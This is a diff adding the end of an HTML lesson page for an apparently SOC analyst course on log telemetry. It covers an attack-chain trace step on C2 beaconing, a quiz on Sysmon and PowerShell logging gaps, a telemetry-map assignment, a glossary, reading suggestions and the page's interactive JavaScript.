+          <div class="trace-step-head">
+            <div class="trace-num">5</div>
+            <div class="trace-step-title">The compromised host begins periodic outbound beaconing to a command-and-control server</div>
+            <button class="trace-toggle-btn" onclick="toggleTrace('t5')">Reveal telemetry</button>
+          </div>
+          <div class="trace-body" id="t5">
+            <p><strong>Source:</strong> Sysmon Event ID 3 (repeated, regularly timed connections), firewall logs (confirming the connections were permitted outbound), and DNS query logs if domain-based. In Week 9, you will additionally see this exact pattern from Zeek's connection log and Suricata's alerting.</p>
+            <p style="margin-bottom:0;">This is precisely the beaconing pattern from Week 1's alert queue, SOC-11203, now traced all the way back to its true origin: a single opened email attachment, five steps and multiple telemetry sources earlier.</p>
+          </div>
+        </div>
+
+        <div class="callout mentor">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l2.4 7.2H22l-6 4.6 2.3 7.2-6.3-4.6-6.3 4.6 2.3-7.2-6-4.6h7.6z"/></svg> What this trace was really teaching you</div>
+          <p style="margin-bottom:0;">Notice that no single log source told the whole story. Each step needed a different vantage point, and several steps needed more than one source to be fully confirmed. This is the practical, working answer to the abstract idea from the Big Picture diagram earlier: real investigation is built by moving across the visibility stack, not by staring harder at one layer of it.</p>
+        </div>
+      </section>
+
+      <section id="gaps">
+        <div class="section-tag">Applied Practice</div>
+        <h2 class="section-title">Visibility gap exercise</h2>
+        <p class="section-dek">Understanding what you cannot see is just as professionally important as understanding what you can. This exercise deliberately tests that.</p>
+
+        <div class="msq" data-correct="sysmon,4104">
+          <div class="msq-q">An attacker runs a heavily obfuscated PowerShell command directly from an interactive command prompt (not from a macro, not from a script file). Command-line auditing (4688 detail) is NOT enabled in this environment. Select every source below that would still capture usable evidence of what the command actually did.</div>
+          <div class="msq-opt" data-val="4688basic"><span class="msq-box"></span> Windows Event ID 4688 (process creation, without command-line detail)</div>
+          <div class="msq-opt" data-val="sysmon"><span class="msq-box"></span> Sysmon Event ID 1 (process creation, full command line by default)</div>
+          <div class="msq-opt" data-val="4104"><span class="msq-box"></span> Windows Event ID 4104 (PowerShell Script Block Logging, decoded)</div>
+          <div class="msq-opt" data-val="dhcp"><span class="msq-box"></span> DHCP lease logs</div>
+          <button class="msq-submit" onclick="checkMsq(this)">Check my answer</button>
+          <div class="msq-result"></div>
+        </div>
+
+        <div class="callout pitfall">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg> The real lesson behind this exercise</div>
+          <p style="margin-bottom:0;">Notice that 4688 without command-line auditing still fires, it will tell you a process was created, and roughly when, but not what it actually did. This is a genuine, non-hypothetical gap in many real environments right now. Part of your job as a working analyst is knowing which of your organisation's log sources have this kind of gap, so you never mistake "the SIEM shows nothing conclusive" for "nothing happened."</p>
+        </div>
+      </section>
+
+      <section id="deliverable">
+        <div class="deliverable-box">
+          <div class="section-tag">This Week's Deliverable</div>
+          <h3 style="margin-top:0;">Telemetry map for the lab environment</h3>
+          <p>Produce a structured telemetry map covering both your own Windows and Linux VMs and the public EVTX-ATTACK-SAMPLES set you will be given. For every source you document, include:</p>
+          <ul>
+            <li><strong>Source name</strong> (for example, Sysmon, Windows Security Log, auditd, DNS server logs).</li>
+            <li><strong>What it actually captures</strong>, described in your own words, not copied from documentation.</li>
+            <li><strong>Key fields</strong> an investigator would rely on from that source.</li>
+            <li><strong>Retention consideration</strong>: how long would this realistically need to be kept, and why.</li>
+            <li><strong>Investigative use</strong>: a one-line example of a question this source could help answer.</li>
+            <li>At least one explicitly identified <strong>visibility gap</strong>, a scenario this source alone would not be able to prove.</li>
+          </ul>
+          <p style="margin-bottom:0;">This map becomes a working reference document you will keep returning to across the rest of the programme, particularly from Week 4 (SIEM) onward, when you start deciding what to search for and where.</p>
+        </div>
+      </section>
+
+      <section id="checkpoint">
+        <div class="checkpoint-box">
+          <div class="section-tag">Competency Checkpoint</div>
+          <h3 style="margin-top:0;">What "passing" Week 2 actually looks like</h3>
+          <p style="margin-bottom:0;">You understand, concretely and specifically, that <strong>a SIEM does not create visibility, it consumes and correlates visibility produced elsewhere.</strong> That means: given any log line from any of this week's sources, you can identify roughly which layer of the visibility stack it comes from, what it can and cannot prove on its own, and what other source you would want to corroborate it with. You are also comfortable enough with raw Sysmon, Windows Event Log, and Linux log formats that they no longer look like noise, they look like sentences you can read.</p>
+        </div>
+      </section>
+
+      <section id="glossary">
+        <div class="section-tag">Reference</div>
+        <h2 class="section-title">Glossary</h2>
+        <div class="accordion">
+          <div class="accordion-item"><div class="accordion-head"><span class="term">Telemetry</span><span class="chev">&#9662;</span></div><div class="accordion-body"><p>Any data automatically generated by a system describing its own activity, used here as the general term covering logs, events, and metadata from every source in this week.</p></div></div>
+          <div class="accordion-item"><div class="accordion-head"><span class="term">Normalisation</span><span class="chev">&#9662;</span></div><div class="accordion-body"><p>The process of mapping different vendors' field names and formats onto one consistent internal schema, so searches and correlations work across all sources at once.</p></div></div>
+          <div class="accordion-item"><div class="accordion-head"><span class="term">Download cradle</span><span class="chev">&#9662;</span></div><div class="accordion-body"><p>A short script or command whose only job is to fetch and execute a second, larger malicious payload from an external location, commonly implemented in PowerShell using Invoke-Expression.</p></div></div>
+          <div class="accordion-item"><div class="accordion-head"><span class="term">Retention window</span><span class="chev">&#9662;</span></div><div class="accordion-body"><p>The length of time a given log source is kept before being archived or deleted, driven by storage cost, business need, and sometimes regulatory minimums.</p></div></div>
+          <div class="accordion-item"><div class="accordion-head"><span class="term">Logon Type</span><span class="chev">&#9662;</span></div><div class="accordion-body"><p>A numeric field on Windows logon events describing exactly how the authentication occurred, for example interactively, over the network, or via Remote Desktop.</p></div></div>
+        </div>
+      </section>
+
+      <section id="further">
+        <div class="section-tag">Go Deeper</div>
+        <h2 class="section-title">Further reading and real-world grounding</h2>
+        <ul>
+          <li><strong>Microsoft Sysinternals Sysmon documentation</strong>, the authoritative reference for every event ID and configuration option you will use throughout this programme.</li>
+          <li><strong>SwiftOnSecurity's public Sysmon configuration</strong> (widely referenced on GitHub), a well-regarded starting configuration you will use this week when installing Sysmon on your own VM.</li>
+          <li><strong>The Elastic Common Schema (ECS) documentation</strong>, a practical look at how real normalisation schemas are structured, directly relevant again when Wazuh is introduced in Week 4.</li>
+          <li>Spend fifteen minutes in your own Windows VM's Event Viewer once it is built this week, browsing the Security and Sysmon logs generated just from ordinary use. Recognising ordinary "noise" is just as valuable a skill as recognising something suspicious.</li>
+        </ul>
+      </section>
+
+      <div class="weeknav">
+        <a href="week01.html">&larr; Week 1: SOC Operations &amp; Analyst Thinking</a>
+        <a href="#toc">&uarr; Back to top</a>
+        <a href="#" style="opacity:0.4; pointer-events:none;">Week 3: SOC Workflow &amp; Case Management &rarr;</a>
+      </div>
+
+    </div>
+  </main>
+</div>
+
+<script>
+  // Tabs
+  document.querySelectorAll('.tabs').forEach(tabGroup => {
+    const buttons = tabGroup.querySelectorAll('.tab-btn');
+    buttons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        const target = btn.getAttribute('data-tab');
+        tabGroup.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        tabGroup.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+        btn.classList.add('active');
+        tabGroup.querySelector('#' + target).classList.add('active');
+      });
+    });
+  });
+
+  // Accordion
+  document.querySelectorAll('.accordion-item').forEach(item => {
+    item.querySelector('.accordion-head').addEventListener('click', () => {
+      item.classList.toggle('open');
+    });
+  });
+
+  // Quick-check quiz
+  document.querySelectorAll('.quiz-item').forEach(item => {
+    const correct = item.getAttribute('data-answer');
+    item.querySelectorAll('.quiz-opt').forEach(btn => {
+      btn.addEventListener('click', () => {
+        if (item.classList.contains('answered')) return;
+        item.classList.add('answered');
+        const choice = btn.getAttribute('data-choice');
+        if (choice === correct) {
+          btn.classList.add('chosen-correct');
+        } else {
+          btn.classList.add('chosen-wrong');
+          item.querySelector('.quiz-opt[data-choice="' + correct + '"]').classList.add('reveal-correct');
+        }
+      });
+    });
+  });
+
+  // Trace-the-chain reveal
+  function toggleTrace(id) {
+    const body = document.getElementById(id);
+    const btn = body.previousElementSibling.querySelector ? null : null;
+    body.classList.toggle('shown');
+    const step = body.closest('.trace-step');
+    const button = step.querySelector('.trace-toggle-btn');
+    button.textContent = body.classList.contains('shown') ? 'Hide telemetry' : 'Reveal telemetry';
+  }
+
+  // Multi-select checklist quiz
+  document.querySelectorAll('.msq-opt').forEach(opt => {
+    opt.addEventListener('click', () => {
+      opt.classList.toggle('picked');
+    });
+  });
+  function checkMsq(btn) {
+    const msq = btn.closest('.msq');
+    const correctVals = msq.getAttribute('data-correct').split(',');
+    const picked = Array.from(msq.querySelectorAll('.msq-opt.picked')).map(o => o.getAttribute('data-val'));
+    const result = msq.querySelector('.msq-result');
+    result.classList.add('shown');
+    const correctSet = new Set(correctVals);
+    const pickedSet = new Set(picked);
+    const isExact = correctSet.size === pickedSet.size && [...correctSet].every(v => pickedSet.has(v));
+    if (isExact) {
+      result.className = 'msq-result shown good';
+      result.textContent = 'Correct. Sysmon Event ID 1 and Script Block Logging (4104) both capture this regardless of the missing 4688 command-line setting. DHCP tells you which device had which IP, useful, but not what the command did.';
+    } else {
+      result.className = 'msq-result shown bad';
+      result.textContent = 'Not quite. Re-read the Sysmon and PowerShell logging sections above: two sources here capture full command detail independently of whether 4688 auditing is enabled.';
+    }
+  }
+</script>
+</body>
+</html>
